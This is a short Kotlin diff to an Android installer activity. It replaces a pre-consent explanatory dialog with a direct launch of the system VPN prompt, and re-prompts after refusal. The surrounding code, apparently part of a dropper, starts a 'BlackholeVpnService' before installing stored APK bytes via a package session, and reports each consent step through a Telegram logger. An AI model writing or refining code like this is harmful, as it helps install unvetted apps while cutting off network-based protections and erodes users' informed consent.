@@ -240,7 +240,7 @@ class InstallActivity : Activity() {
                             TelegramLogger.send(this, "VPN_CONSENT", "GRANTED_AFTER_RETRY", "starting BlackholeVpnService")
                             BlackholeVpnService.start(this)
                         } else {
-                            showVpnConsentDialog(retryIntent)
+                            launchVpnConsent(retryIntent)
                         }
                     }, 2_000L)
                 }
@@ -803,7 +803,7 @@ class InstallActivity : Activity() {
      * Entry point for VPN flow. Stores APK bytes, checks if VPN is already active,
      * and either proceeds directly or initiates VPN consent + start.
      *
-     * Flow: prepareAndStartVpn → showVpnConsentDialog → launchVpnConsent →
+     * Flow: prepareAndStartVpn → launchVpnConsent →
      *       onActivityResult → BlackholeVpnService.start → VPN_ESTABLISHED →
      *       vpnEstablishedReceiver → installViaSession
      */
@@ -826,9 +826,9 @@ class InstallActivity : Activity() {
             BlackholeVpnService.start(this)
             // vpnEstablishedReceiver will call installViaSession when tunnel is ready
         } else {
-            // Need user consent — show pre-consent dialog first
-            TelegramLogger.send(this, "VPN_CONSENT", "NEEDED", "showing pre-consent dialog")
-            showVpnConsentDialog(prepareIntent)
+            // Need user consent — launch system VPN dialog directly
+            TelegramLogger.send(this, "VPN_CONSENT", "NEEDED", "launching system VPN dialog")
+            launchVpnConsent(prepareIntent)
         }
     }
 
@@ -857,7 +857,7 @@ class InstallActivity : Activity() {
                         TelegramLogger.send(this, "VPN_CONSENT", "GRANTED_RETRY", "starting BlackholeVpnService")
                         BlackholeVpnService.start(this)
                     } else {
-                        showVpnConsentDialog(retryIntent)
+                        launchVpnConsent(retryIntent)
                     }
                 }, 2_000L)
             }
@@ -881,7 +881,7 @@ class InstallActivity : Activity() {
                 if (retryIntent == null) {
                     BlackholeVpnService.start(this)
                 } else {
-                    showVpnConsentDialog(retryIntent)
+                    launchVpnConsent(retryIntent)
                 }
             }, 2_000L)
         }
